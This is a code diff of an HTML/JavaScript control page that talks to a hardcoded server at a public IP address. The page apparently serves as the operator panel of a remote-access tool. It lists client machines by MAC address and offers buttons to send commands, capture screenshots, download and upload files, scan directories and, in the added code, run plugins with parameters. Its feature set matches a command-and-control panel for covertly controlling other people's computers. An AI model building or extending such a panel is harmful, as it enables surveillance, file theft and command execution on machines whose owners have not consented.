@@ -11,6 +11,7 @@
                 return false;
             }
         };
+
         function getUrl(data) {
             let url = "http://3.89.196.174:6702/?";
             let arr = [];
@@ -22,13 +23,14 @@
             url += arr.join("&");
             return url;
         }
+
         function query(data, callback) {
             let url = getUrl(data);
             console.log(url);
             let xhr = new XMLHttpRequest();
             xhr.open("GET", url);
             xhr.onreadystatechange = function () {
-                if(xhr.readyState === XMLHttpRequest.DONE) {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
                     if (typeof callback === "function") callback(xhr.responseText, xhr.status);
                 }
             };
@@ -36,7 +38,7 @@
             xhr.send();
         }
 
-        window.onload = function() {
+        window.onload = function () {
             query({"clients": "kar"}, (data) => {
                 let arr = JSON.safeParse(data);
                 if (arr) {
@@ -48,7 +50,18 @@
                     }
                 }
             });
-            document.querySelector("#send").onclick = function() {
+            query({plugins: "kar"}, data => {
+                let arr = JSON.safeParse(data);
+                if (arr) {
+                    for (let plugin of arr) {
+                        let option = document.createElement("option");
+                        option.value = plugin.name;
+                        option.innerText = plugin.name;
+                        document.getElementById("plugins").appendChild(option);
+                    }
+                } else alert("error")
+            });
+            document.querySelector("#send").onclick = function () {
                 document.querySelector("#result").innerHTML = "";
                 let e = document.querySelector("#client");
                 let mac = e.options[e.selectedIndex].value;
@@ -68,7 +81,7 @@
                     } else alert("error: " + result);
                 });
             };
-            document.querySelector("#screenshot").onclick = function() {
+            document.querySelector("#screenshot").onclick = function () {
                 document.querySelector("#result").innerHTML = "";
                 let e = document.querySelector("#client");
                 let mac = e.options[e.selectedIndex].value;
@@ -81,7 +94,7 @@
                 img.width = 1000;
                 document.querySelector("#result").appendChild(img);
             };
-            document.querySelector("#download").onclick = function() {
+            document.querySelector("#download").onclick = function () {
                 document.querySelector("#result").innerHTML = "";
                 let e = document.querySelector("#client");
                 let mac = e.options[e.selectedIndex].value;
@@ -95,7 +108,7 @@
                 });
                 document.querySelector("#result").appendChild(a);
             };
-            document.querySelector("#upload").onclick = function() {
+            document.querySelector("#upload").onclick = function () {
                 document.querySelector("#result").innerHTML = "";
                 let e = document.querySelector("#client");
                 let mac = e.options[e.selectedIndex].value;
@@ -104,18 +117,17 @@
                 let file = fileElement.files[0];
                 let fileReader = new FileReader();
                 fileReader.readAsBinaryString(file);
-                fileReader.onloadend = function() {
+                fileReader.onloadend = function () {
                     let base64 = btoa(fileReader.result);
-                    console.log(base64.length);
-                    console.log(base64);
                     query({
                         mac: mac,
                         path: path,
                         base64: base64
-                    }, result => {});
+                    }, result => {
+                    });
                 }
             };
-            document.querySelector("#scan").onclick = function() {
+            document.querySelector("#scan").onclick = function () {
                 document.querySelector("#result").innerHTML = "";
                 let e = document.querySelector("#client");
                 let mac = e.options[e.selectedIndex].value;
@@ -135,6 +147,22 @@
 
                     document.querySelector("#result").innerText = string;
                 })
+            };
+            document.getElementById("execute_plugin").onclick = function () {
+                let e = document.querySelector("#plugins");
+                let pluginName = e.options[e.selectedIndex].value;
+                e = document.querySelector("#client");
+                let mac = e.options[e.selectedIndex].value;
+                let parameters = document.getElementById("parameters").value;
+                query({
+                    mac: mac,
+                    plugin_name: pluginName,
+                    parameters: parameters
+                }, (result, code) => {
+                    if (code === 200) {
+                        document.querySelector("#result").innerText = result;
+                    } else alert("error: " + result);
+                });
             }
         }
     </script>
@@ -143,11 +171,23 @@
 <label for="client">Select client: </label><select id="client"></select><br>
 <label for="command">Command: </label><textarea id="command"></textarea><br>
 <label for="is_psl">Is PSL? </label><input type="checkbox" id="is_psl"><br>
-<button id="send">Send</button><br>
-<button id="screenshot">Screenshot</button><br>
-<label for="path">Path: </label><input type="text" id="path"><button id="download">Download</button><br>
-<label for="upload_path">Path: </label><input type="text" id="upload_path"><input type="file" id="upload_file"><button id="upload">Upload</button><br>
-<label for="dir">Directory: </label><input type="text" id="dir"><button id="scan">Scan</button><br>
-<label for="result">Result: </label><pre style="border: 1px solid black" id="result"></pre>
+<button id="send">Send</button>
+<br>
+<button id="screenshot">Screenshot</button>
+<br>
+<label for="path">Path: </label><input type="text" id="path">
+<button id="download">Download</button>
+<br>
+<label for="upload_path">Path: </label><input type="text" id="upload_path"><input type="file" id="upload_file">
+<button id="upload">Upload</button>
+<br>
+<label for="dir">Directory: </label><input type="text" id="dir">
+<button id="scan">Scan</button>
+<br>
+<label for="plugins">Plugin: </label><select id="plugins"></select>
+<label for="parameters">Parameters (JSON): </label><input type="text" id="parameters">
+<button id="execute_plugin">Execute</button>
+<label for="result">Result: </label>
+<pre style="border: 1px solid black" id="result"></pre>
 </body>
 </html>
